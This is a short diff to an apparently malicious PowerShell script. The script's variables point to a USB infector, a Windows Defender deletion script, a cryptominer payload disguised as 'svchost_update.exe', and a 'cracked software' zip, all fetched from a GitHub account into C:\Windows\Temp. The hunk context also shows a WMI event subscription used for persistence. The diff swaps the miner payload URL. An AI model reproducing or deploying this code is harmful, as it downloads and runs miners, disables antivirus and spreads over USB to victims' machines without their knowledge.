@@ -6,7 +6,7 @@ $monitorScriptPath = "C:\Windows\Temp\monitor.ps1"
 $infectorUrl = "https://github.com/NaomiMendoza127/USB/raw/refs/heads/main/infector.ps1"
 $windowsDefenderScriptPath = "C:\Windows\Temp\windowsdenderscript.ps1"
 $windowsDefenderScriptUrl = "https://github.com/NaomiMendoza127/WinDefenderDelete/raw/refs/heads/main/WindefendDelete.ps1"
-$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/R_Final.exe"
+$payloadUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/one-sec.exe"
 $payloadPath = "C:\Windows\Temp\svchost_update.exe"
 $crackedSoftwareZipUrl = "https://github.com/NaomiMendoza127/miner/raw/refs/heads/main/SystemCore.zip"
 $crackedSoftwareZipPath = "C:\Windows\Temp\update_package.zip"
@@ -210,3 +210,4 @@ try {
 } catch {
     Write-Output "Error setting WMI event subscription: $_"
 }
+
